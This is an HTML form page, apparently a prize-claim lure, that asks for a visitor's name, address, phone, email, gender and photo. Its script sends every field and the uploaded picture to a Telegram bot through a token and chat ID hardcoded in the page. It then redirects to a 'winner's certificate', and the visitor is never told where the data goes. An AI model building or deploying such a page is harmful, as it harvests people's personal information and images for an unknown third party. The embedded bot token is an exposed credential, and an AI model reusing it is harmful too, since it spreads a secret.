<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Form</title>
</head>
<body>
    <form id="user-form">
        <label>Full Name: <input type="text" name="fullName" required></label><br>
        <label>Address: <input type="text" name="address" required></label><br>
        <label>Phone Number: <input type="text" name="phoneNumber" required></label><br>
        <label>Email: <input type="email" name="email" required></label><br>
        <label>Gender: 
            <select name="gender" required>
                <option value="male">Male</option>
                <option value="female">Female</option>
            </select>
        </label><br>
        <label>Upload Picture: <input type="file" name="picture" accept="image/*" required></label><br>
        <button type="submit">Submit</button>
    </form>
    <script>
    document.getElementById("user-form").addEventListener("submit", async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);

    // Save the full name locally
    const fullName = formData.get("fullName");
    localStorage.setItem("userFullName", fullName);

    // Telegram API setup
    const message = `
        Name: ${formData.get("fullName")}
        Address: ${formData.get("address")}
        Phone: ${formData.get("phoneNumber")}
        Email: ${formData.get("email")}
        Gender: ${formData.get("gender")}
    `;

    const telegramBotToken = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";
    const chatId = "874563737";

    // Send text message
    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    });

    // Send picture
    const pictureFile = formData.get("picture");
    const photoData = new FormData();
    photoData.append("chat_id", chatId);
    photoData.append("photo", pictureFile);

    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: "POST",
        body: photoData
    });

    // Redirect to winner's certificate
    window.location.href = "winners.html";
});
</script>
</body>
</html>
